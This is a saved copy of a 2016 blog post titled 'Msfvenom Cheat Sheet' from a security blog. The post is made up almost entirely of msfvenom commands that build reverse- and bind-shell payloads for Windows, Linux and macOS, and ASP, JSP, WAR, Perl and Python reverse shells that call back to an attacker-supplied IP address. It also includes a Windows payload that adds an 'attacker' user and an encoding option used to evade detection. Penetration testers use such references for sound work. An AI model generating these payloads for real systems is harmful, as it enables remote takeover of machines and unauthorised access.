@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en-US"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<title>Msfvenom Cheat Sheet – Security-Geek</title>
+
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width">
+
+	<link rel="profile" href="http://gmpg.org/xfn/11">
+	<link rel="pingback" href="http://security-geek.in/xmlrpc.php">
+
+	
+
+	<link rel="dns-prefetch" href="http://s0.wp.com/">
+<link rel="dns-prefetch" href="http://s.gravatar.com/">
+<link rel="dns-prefetch" href="http://fonts.googleapis.com/">
+<link rel="dns-prefetch" href="http://s.w.org/">
+<link rel="alternate" type="application/rss+xml" title="Security-Geek » Feed" href="http://security-geek.in/feed/">
+<link rel="alternate" type="application/rss+xml" title="Security-Geek » Comments Feed" href="http://security-geek.in/comments/feed/">
+		<script src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/ca-pub-3889843485577566.js"></script><script id="twitter-wjs" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/widgets.js"></script><script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.3\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/security-geek.in\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.8.3"}};
+			!function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a){case"flag":return k.fillText(f(55356,56826,55356,56819),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,56826,8203,55356,56819),0,0),c=j.toDataURL(),b!==c&&(k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447),0,0),c=j.toDataURL(),b!==c);case"emoji4":return k.fillText(f(55358,56794,8205,9794,65039),0,0),d=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55358,56794,8203,9794,65039),0,0),e=j.toDataURL(),d!==e}return!1}function e(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i,j=b.createElement("canvas"),k=j.getContext&&j.getContext("2d");for(i=Array("flag","emoji4"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script><script src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/wp-emoji-release.js" type="text/javascript" defer="defer"></script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel="stylesheet" id="athemes-headings-fonts-css" href="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/css.css" type="text/css" media="all">
+<link rel="stylesheet" id="athemes-glyphs-css" href="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/athemes-glyphs.css" type="text/css" media="all">
+<link rel="stylesheet" id="athemes-bootstrap-css" href="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/bootstrap.css" type="text/css" media="all">
+<link rel="stylesheet" id="athemes-style-css" href="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/style.css" type="text/css" media="all">
+<style id="athemes-style-inline-css" type="text/css">
+a, #main-navigation .sf-menu > ul > li:hover:after, #main-navigation .sf-menu > ul > li.sfHover:after, #main-navigation .sf-menu > ul > li.current_page_item:after, #main-navigation .sf-menu > ul > li.current-menu-item:after, .entry-title a:hover, .comment-list li.comment .comment-author .fn a:hover, .comment-list li.comment .reply a, .widget li a:hover, .site-extra .widget li a:hover, .site-extra .widget_athemes_social_icons li a:hover [class^="ico-"]:before, .site-footer a:hover { color: ; }
+button:hover, a.button:hover, input[type="button"]:hover, .widget-title span, input[type="reset"]:hover, input[type="submit"]:hover { border-color: ; }
+button:hover, a.button:hover, .widget_athemes_social_icons li a:hover [class^="ico-"]:before, input[type="button"]:hover, .widget_athemes_tabs .widget-tab-nav li.active a, input[type="reset"]:hover, .comments-link a, .site-content [class*="navigation"] a:hover, input[type="submit"]:hover, #main-navigation li:hover ul, #main-navigation li.sfHover ul, #main-navigation li a:hover, #main-navigation li.sfHover > a, #main-navigation li.current_page_item > a, #main-navigation li.current-menu-item > a, #main-navigation li.current-menu-parent > a, #main-navigation li.current-page-parent > a, #main-navigation li.current-page-ancestor > a, #main-navigation li.current_page_ancestor > a { background: ; }
+.site-title a { color: ; }
+.site-description { color: ; }
+.entry-title, .entry-title a { color: ; }
+body { color: ; }
+
+</style>
+<link rel="stylesheet" id="social-logos-css" href="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/social-logos.css" type="text/css" media="all">
+<link rel="stylesheet" id="jetpack_css-css" href="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/jetpack.css" type="text/css" media="all">
+<script type="text/javascript" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/jquery.js"></script>
+<script type="text/javascript" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/jquery-migrate.js"></script>
+<script type="text/javascript" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/bootstrap.js"></script>
+<script type="text/javascript" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/superfish.js"></script>
+<script type="text/javascript" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/supersubs.js"></script>
+<script type="text/javascript" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/settings.js"></script>
+<link rel="https://api.w.org/" href="http://security-geek.in/wp-json/">
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://security-geek.in/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://security-geek.in/wp-includes/wlwmanifest.xml"> 
+<link rel="prev" title="Linux Privilege Escalation Cheat Sheet" href="http://security-geek.in/2016/09/01/linux-privilege-escalation-cheat-sheet/">
+<link rel="next" title="Presentation on Windows Privilege Escalation at Null Delhi" href="http://security-geek.in/2016/09/12/presentation-on-windows-privilege-escalation-at-null-delhi/">
+<meta name="generator" content="WordPress 4.8.3">
+<link rel="canonical" href="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/a_002.html">
+<link rel="shortlink" href="http://wp.me/p7abPW-3n">
+<link rel="alternate" type="application/json+oembed" href="http://security-geek.in/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fsecurity-geek.in%2F2016%2F09%2F07%2Fmsfvenom-cheat-sheet%2F">
+<link rel="alternate" type="text/xml+oembed" href="http://security-geek.in/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fsecurity-geek.in%2F2016%2F09%2F07%2Fmsfvenom-cheat-sheet%2F&amp;format=xml">
+
+<link rel="dns-prefetch" href="http://v0.wordpress.com/">
+<link rel="dns-prefetch" href="http://i0.wp.com/">
+<link rel="dns-prefetch" href="http://i1.wp.com/">
+<link rel="dns-prefetch" href="http://i2.wp.com/">
+<style type="text/css">img#wpstats{display:none}</style><!--[if lt IE 9]>
+<script src="http://security-geek.in/wp-content/themes/hiero/js/html5shiv.js"></script>
+<![endif]-->
+
+<!-- Jetpack Open Graph Tags -->
+<meta property="og:type" content="article">
+<meta property="og:title" content="Msfvenom Cheat Sheet">
+<meta property="og:url" content="http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/">
+<meta property="og:description" content="For those who are new to msfvenom , please have a look at the Wiki : Here A quick custom cheatsheet for creating payloads using msfvenom. Major chunk of work happens around these payloads.For more …">
+<meta property="article:published_time" content="2016-09-07T08:53:14+00:00">
+<meta property="article:modified_time" content="2016-09-07T09:01:32+00:00">
+<meta property="og:site_name" content="Security-Geek">
+<meta property="og:image" content="https://s0.wp.com/i/blank.jpg">
+<meta property="og:locale" content="en_US">
+<meta name="twitter:site" content="@snypter">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:creator" content="@Snypter">
+<link rel="preload" href="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/integrator_002.js"><script type="text/javascript" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/integrator_002.js"></script><link rel="preload" href="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/integrator.js"><script type="text/javascript" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/integrator.js"></script><link rel="stylesheet" type="text/css" id="gravatar-card-css" href="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/hovercard.css"><link rel="stylesheet" type="text/css" id="gravatar-card-services-css" href="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/services.css"><script type="text/javascript" charset="utf-8" async="" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/timeline.js"></script><link rel="prefetch" href="https://securepubads.g.doubleclick.net/static/3p_cookie.html"></head>
+
+<body class="post-template-default single single-post postid-209 single-format-standard">
+
+	<header id="masthead" class="site-header" role="banner">
+		<div class="clearfix container">
+			<div class="site-branding">
+							
+										<div class="site-title">
+						<a href="http://security-geek.in/" title="Security-Geek" rel="home">
+							Security-Geek						</a>
+					</div>
+					<div class="site-description">News , Whitepapers , Tools and more</div>
+							<!-- .site-branding --></div>
+
+						
+			<nav id="main-navigation" class="main-navigation" role="navigation">
+				<a href="#main-navigation" class="nav-open">Menu</a>
+				<a href="#" class="nav-close">Close</a>
+				<div class="clearfix sf-menu"><ul id="menu-top-menu" class="menu sf-js-enabled"><li id="menu-item-168" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-168"><a href="http://security-geek.in/category/whitepapers/">Whitepapers</a>
+<ul class="sub-menu sf-js-enabled" style="float: none; width: 12em; display: none; visibility: hidden;">
+	<li id="menu-item-170" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-170" style="white-space: normal; float: left; width: 100%;"><a href="http://security-geek.in/category/mind-maps/" style="float: none; width: auto;">Mind Maps</a></li>
+	<li id="menu-item-169" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-169" style="white-space: normal; float: left; width: 100%;"><a href="http://security-geek.in/category/tutorials/" style="float: none; width: auto;">Tutorials</a></li>
+</ul>
+</li>
+<li id="menu-item-171" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-171"><a href="http://security-geek.in/category/news/">News</a>
+<ul class="sub-menu sf-js-enabled" style="float: none; width: 12em; display: none; visibility: hidden;">
+	<li id="menu-item-183" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-183" style="white-space: normal; float: left; width: 100%;"><a href="http://security-geek.in/category/humor/" style="float: none; width: auto;">Humor</a></li>
+</ul>
+</li>
+<li id="menu-item-207" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-207"><a href="http://security-geek.in/category/cheat-sheets/">Cheat Sheets</a></li>
+<li id="menu-item-184" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-184"><a href="http://security-geek.in/contact/">Contact</a></li>
+<li id="menu-item-185" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-185"><a href="http://security-geek.in/about-me/">About Me</a></li>
+</ul></div>			<!-- #main-navigation --></nav>
+		</div>
+	<!-- #masthead --></header>
+
+	<div id="main" class="site-main">
+		<div class="clearfix container">
+	<div id="primary" class="content-area">
+		<div id="content" class="site-content" role="main">
+
+		
+			
+<article id="post-209" class="clearfix post-209 post type-post status-publish format-standard hentry category-cheat-sheets tag-cheat-sheet tag-creating-payloads-using-msfvenom tag-msfvenom tag-msfvenom-wiki">
+	<header class="entry-header">
+		
+		<h1 class="entry-title">Msfvenom Cheat Sheet</h1>
+
+		<div class="entry-meta">
+			<span class="posted-on">Posted on <a href="http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/" title="2:23 pm" rel="bookmark"><time class="entry-date published updated" datetime="2016-09-07T14:23:14+00:00">September 7, 2016</time></a></span><span class="byline"> by <span class="author vcard"><a class="url fn n" href="http://security-geek.in/author/5nyp73r/" title="View all posts by 5nyp73r">5nyp73r</a></span></span>		<!-- .entry-meta --></div>
+	<!-- .entry-header --></header>
+
+			
+
+	<div class="clearfix entry-content">
+		<p>For those who are new to msfvenom , please have a look at the Wiki : <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom" target="_blank">Here</a></p>
+<p>A quick custom cheatsheet for creating payloads using msfvenom. Major
+ chunk of work happens around these payloads.For more info refer: (Note:
+ RHOST is not mandatory in any of the bind shells)</p>
+<p>Listing payloads<br>
+<code>msfvenom -l</code></p>
+<p><strong>Windows Paylaods</strong><br>
+Reverse Shell :<br>
+<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe &gt; reverse.exe</code></p>
+<p>Bind Shell:<br>
+<code>msfvenom -p windows/meterpreter/bind_tcp RHOST= (IP Address) LPORT=(Your Port) -f exe &gt; bind.exe</code></p>
+<p>Create User:<br>
+<code>msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe &gt; adduser.exe<br>
+</code></p>
+<p>CMD shell:<br>
+<code>msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe &gt; prompt.exe</code></p>
+<p>Encoder:<br>
+<code>msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe &gt; encoded.exe</code></p>
+<p>One can also use the <code>-a</code> to specify the architecture or the <code>--platform</code></p>
+<p><strong>Linux Payloads</strong><br>
+Reverse Shell:<br>
+<code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf &gt;reverse.elf</code></p>
+<p>Bind Shell:<br>
+<code>msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf &gt; bind.elf</code></p>
+<p>Generic Shell:<br>
+<code>msfvenom -p generic/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf &gt; term.elf</code></p>
+<p><strong>MAC Paylaods</strong><br>
+Reverse Shell:<br>
+<code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho &gt; reverse.macho</code></p>
+<p>Bind Shell:<br>
+<code>msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho &gt; bind.macho</code></p>
+<p><strong>Web Based Payloads </strong></p>
+<p>ASP<br>
+Reverse shell :<br>
+<code>msfvenom -p windows/meterpreter/reverse_tcp LHO<code>S</code>T=(IP Address) LPORT=(Your Port) -f asp &gt;reverse.asp</code></p>
+<p>JSP<br>
+Reverse shell:<br>
+<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw&gt; reverse.jsp<br>
+</code></p>
+<p>WAR<br>
+Reverse Shell:<br>
+<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war &gt; reverse.war</code></p>
+<p><strong>Script Langauge payloads</strong></p>
+<p>Perl<br>
+<code>msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw &gt; reverse.pl</code></p>
+<p>Python<br>
+<code>msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw &gt; reverse.py</code></p>
+<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-facebook"><a rel="nofollow" data-shared="sharing-facebook-209" class="share-facebook sd-button share-icon no-text" href="http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/?share=facebook&amp;nb=1" target="_blank" title="Click to share on Facebook"><span><span class="share-count">28</span></span><span class="sharing-screen-reader-text">Click to share on Facebook (Opens in new window)<span class="share-count">28</span></span></a></li><li class="share-reddit"><a rel="nofollow" data-shared="" class="share-reddit sd-button share-icon no-text" href="http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/?share=reddit&amp;nb=1" target="_blank" title="Click to share on Reddit"><span></span><span class="sharing-screen-reader-text">Click to share on Reddit (Opens in new window)</span></a></li><li class="share-linkedin"><a rel="nofollow" data-shared="sharing-linkedin-209" class="share-linkedin sd-button share-icon no-text" href="http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/?share=linkedin&amp;nb=1" target="_blank" title="Click to share on LinkedIn"><span></span><span class="sharing-screen-reader-text">Click to share on LinkedIn (Opens in new window)</span></a></li><li class="share-google-plus-1"><a rel="nofollow" data-shared="sharing-google-209" class="share-google-plus-1 sd-button share-icon no-text" href="http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/?share=google-plus-1&amp;nb=1" target="_blank" title="Click to share on Google+"><span></span><span class="sharing-screen-reader-text">Click to share on Google+ (Opens in new window)</span></a></li><li class="share-twitter"><a rel="nofollow" data-shared="sharing-twitter-209" class="share-twitter sd-button share-icon no-text" href="http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/?share=twitter&amp;nb=1" target="_blank" title="Click to share on Twitter"><span></span><span class="sharing-screen-reader-text">Click to share on Twitter (Opens in new window)</span></a></li><li class="share-email share-service-visible"><a rel="nofollow" data-shared="" class="share-email sd-button share-icon no-text" href="http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/?share=email&amp;nb=1" target="_blank" title="Click to email this to a friend"><span></span><span class="sharing-screen-reader-text">Click to email this to a friend (Opens in new window)</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow" data-shared="" class="share-jetpack-whatsapp sd-button share-icon no-text" href="whatsapp://send?text=Msfvenom%20Cheat%20Sheet%20http%3A%2F%2Fsecurity-geek.in%2F2016%2F09%2F07%2Fmsfvenom-cheat-sheet%2F" target="_blank" title="Click to share on WhatsApp"><span></span><span class="sharing-screen-reader-text">Click to share on WhatsApp (Opens in new window)</span></a></li><li class="share-end"></li></ul></div></div></div>			<!-- .entry-content --></div>
+
+	<footer class="entry-meta entry-footer">
+		<span class="cat-links"><i class="ico-folder"></i> <a href="http://security-geek.in/category/cheat-sheets/" rel="category tag">Cheat Sheets</a></span><span class="tags-links"><i class="ico-tags"></i> <a href="http://security-geek.in/tag/cheat-sheet/" rel="tag">Cheat sheet</a>, <a href="http://security-geek.in/tag/creating-payloads-using-msfvenom/" rel="tag">creating payloads using msfvenom</a>, <a href="http://security-geek.in/tag/msfvenom/" rel="tag">msfvenom</a>, <a href="http://security-geek.in/tag/msfvenom-wiki/" rel="tag">msfvenom wiki</a></span>	<!-- .entry-meta --></footer>
+<!-- #post-209 --></article>
+
+							<div class="clearfix author-info">
+					<div class="author-photo"><img alt="" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/360a9a373601196ad4d03ff0c28998a9.jpeg" srcset="http://0.gravatar.com/avatar/360a9a373601196ad4d03ff0c28998a9?s=150&amp;d=mm&amp;r=g 2x" class="avatar avatar-75 photo grav-hashed grav-hijack" id="grav-360a9a373601196ad4d03ff0c28998a9-0" height="75" width="75"></div>
+					<div class="author-content">
+						<h3>5nyp73r</h3>
+						<p></p>
+						<div class="author-links">
+							<a href="http://security-geek.in/author/5nyp73r/" rel="me">More Posts</a>
+
+														<a href="http://twitter.com/snypter">Twitter</a>
+							
+														<a href="https://facebook.com/dhruvshahs">Facebook</a>
+							
+														<a href="http://linkedin.com/in/dhruvshahs">LinkedIn</a>
+													</div>
+					</div>
+				<!-- .author-info --></div>
+			
+				<nav role="navigation" id="nav-below" class="post-navigation">
+		<h1 class="screen-reader-text">Post navigation</h1>
+
+	
+		<div class="nav-previous"><a href="http://security-geek.in/2016/09/01/linux-privilege-escalation-cheat-sheet/" rel="prev"><span class="meta-nav"><i class="ico-left-open"></i></span> Linux Privilege Escalation Cheat Sheet</a></div>		<div class="nav-next"><a href="http://security-geek.in/2016/09/12/presentation-on-windows-privilege-escalation-at-null-delhi/" rel="next">Presentation on Windows Privilege Escalation at Null Delhi <span class="meta-nav"><i class="ico-right-open"></i></span></a></div>
+	
+	</nav><!-- #nav-below -->
+	
+			
+		
+		</div><!-- #content -->
+	</div><!-- #primary -->
+
+<div id="widget-area-2" class="site-sidebar widget-area" role="complementary">
+	<aside id="search-3" class="widget widget_search"><form role="search" method="get" class="search-form" action="http://security-geek.in/">
+	<label>
+		<span class="screen-reader-text">Search for:</span>
+		<input class="search-field" placeholder="Search …" name="s" title="Search for:" type="search">
+	</label>
+	<input class="search-submit" value="Search" type="submit">
+</form>
+</aside><aside id="athemes_media_embed-2" class="widget widget_athemes_media_embed">		
+		<div class="widget-oembed">
+			<h3 class="widget-title"><span>Security Videos</span></h3>			
+			<div class="widget-oembed-content"><iframe src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/Mj298dYgkj0.html" gesture="media" allowfullscreen="" height="169" frameborder="0" width="300"></iframe><!-- .widget-oembed-content --></div><div class="widget-oembed-description">Security Related Videos</div>		<!-- .widget-oembed --></div>
+		
+		</aside><aside id="twitter_timeline-2" class="widget widget_twitter_timeline"><h3 class="widget-title"><span>Follow me on Twitter</span></h3><iframe id="twitter-widget-0" scrolling="no" allowtransparency="true" allowfullscreen="true" class="twitter-timeline twitter-timeline-rendered" style="position: static; visibility: visible; display: inline-block; width: 300px; padding: 0px; border: medium none; max-width: 100%; min-width: 180px; margin-top: 0px; margin-bottom: 0px; height: 1628.98px;" data-widget-id="profile:snypter" title="Twitter Timeline" frameborder="0"></iframe></aside><aside id="text-2" class="widget widget_text"><h3 class="widget-title"><span>Ads</span></h3>			<div class="textwidget"><script async="" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/adsbygoogle.js"></script>
+<!-- skyscraper -->
+<ins class="adsbygoogle" style="display:inline-block;width:300px;height:600px" data-ad-client="ca-pub-3889843485577566" data-ad-slot="2951248097" data-adsbygoogle-status="done"><ins id="aswift_0_expand" style="display:inline-table;border:none;height:600px;margin:0;padding:0;position:relative;visibility:visible;width:300px;background-color:transparent;"><ins id="aswift_0_anchor" style="display:block;border:none;height:600px;margin:0;padding:0;position:relative;visibility:visible;width:300px;background-color:transparent;"><iframe marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}" id="aswift_0" name="aswift_0" style="left:0;position:absolute;top:0;width:300px;height:600px;" height="600" frameborder="0" width="300"></iframe></ins></ins></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script></div>
+		</aside><!-- #widget-area-2 --></div>		</div>
+	<!-- #main --></div>
+
+	
+
+	<footer id="colophon" class="site-footer" role="contentinfo">
+		<div class="clearfix container">
+			<div class="site-info">
+				© 2017 Security-Geek. All rights reserved.
+			</div><!-- .site-info -->
+
+		</div>
+	<!-- #colophon --></footer>
+
+	<div style="display:none">
+	<div class="grofile-hash-map-360a9a373601196ad4d03ff0c28998a9">
+	</div>
+	</div>
+
+	<script type="text/javascript">
+		window.WPCOM_sharing_counts = {"http:\/\/security-geek.in\/2016\/09\/07\/msfvenom-cheat-sheet\/":209};
+	</script>
+	
+<script type="text/javascript" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/photon.js"></script>
+<script type="text/javascript" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/devicepx-jetpack.js"></script>
+<script type="text/javascript" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/gprofiles.js"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var WPGroHo = {"my_hash":""};
+/* ]]> */
+</script>
+<script type="text/javascript" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/wpgroho.js"></script>
+<script type="text/javascript" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/twitter-timeline.js"></script>
+<script type="text/javascript" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/wp-embed.js"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var sharing_js_options = {"lang":"en","counts":"1"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/sharing.js"></script>
+<script type="text/javascript">
+var windowOpen;
+			jQuery( document.body ).on( 'click', 'a.share-facebook', function() {
+				// If there's another sharing window open, close it.
+				if ( 'undefined' !== typeof windowOpen ) {
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery( this ).attr( 'href' ), 
+'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
+				return false;
+			});
+var windowOpen;
+			jQuery( document.body ).on( 'click', 'a.share-linkedin', function() {
+				// If there's another sharing window open, close it.
+				if ( 'undefined' !== typeof windowOpen ) {
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery( this ).attr( 'href' ), 
+'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
+				return false;
+			});
+var windowOpen;
+			jQuery( document.body ).on( 'click', 'a.share-google-plus-1', 
+function() {
+				// If there's another sharing window open, close it.
+				if ( 'undefined' !== typeof windowOpen ) {
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery( this ).attr( 'href' ), 
+'wpcomgoogle-plus-1', 'menubar=1,resizable=1,width=480,height=550' );
+				return false;
+			});
+var windowOpen;
+			jQuery( document.body ).on( 'click', 'a.share-twitter', function() {
+				// If there's another sharing window open, close it.
+				if ( 'undefined' !== typeof windowOpen ) {
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery( this ).attr( 'href' ), 
+'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
+				return false;
+			});
+</script>
+<script type="text/javascript" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/e-201744.js" async="" defer="defer"></script>
+<script type="text/javascript">
+	_stq = window._stq || [];
+	_stq.push([ 'view', {v:'ext',j:'1:5.3',blog:'105863136',post:'209',tz:'5.5',srv:'security-geek.in'} ]);
+	_stq.push([ 'clickTrackerInit', '105863136', '209' ]);
+</script>
+
+
+<img src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/g.gif" alt=":)" id="wpstats" height="5" width="6"><div id="sharing_email" style="display: none;">
+		<form action="/2016/09/07/msfvenom-cheat-sheet/" method="post">
+			<label for="target_email">Send to Email Address</label>
+			<input name="target_email" id="target_email" type="email">
+
+			
+				<label for="source_name">Your Name</label>
+				<input name="source_name" id="source_name" type="text">
+
+				<label for="source_email">Your Email Address</label>
+				<input name="source_email" id="source_email" type="email">
+
+						<input id="jetpack-source_f_name" name="source_f_name" class="input" size="25" autocomplete="off" title="This field is for validation and should not be changed" type="text">
+			<script>jQuery( document ).ready( function(){ document.getElementById('jetpack-source_f_name').value = '' });</script>
+			
+			<img style="float: right; display: none" class="loading" src="Msfvenom%20Cheat%20Sheet%20%E2%80%93%20Security-Geek_files/loading.gif" alt="loading" height="16" width="16">
+			<input value="Send Email" class="sharing_send" type="submit">
+			<a rel="nofollow" href="#cancel" class="sharing_cancel">Cancel</a>
+
+			<div class="errors errors-1" style="display: none;">
+				Post was not sent - check your email addresses!			</div>
+
+			<div class="errors errors-2" style="display: none;">
+				Email check failed, please try again			</div>
+
+			<div class="errors errors-3" style="display: none;">
+				Sorry, your blog cannot share posts by email.			</div>
+		</form>
+	</div><iframe id="rufous-sandbox" scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe></body></html>
